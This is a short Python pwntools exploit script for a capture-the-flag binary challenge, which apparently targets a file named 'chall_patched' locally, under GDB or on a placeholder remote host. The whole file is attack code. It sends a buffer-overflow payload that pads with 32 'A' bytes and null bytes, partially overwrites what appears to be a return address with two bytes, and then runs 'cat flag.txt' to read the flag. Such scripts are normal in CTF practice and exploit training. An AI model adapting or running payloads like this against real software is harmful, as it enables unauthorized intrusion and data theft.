#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("addr", 1337)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    payload = flat(b'A'*32, b'\x00'*8, b'\x11\x04', b'\x00'*6, b'cat flag.txt  ')
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()
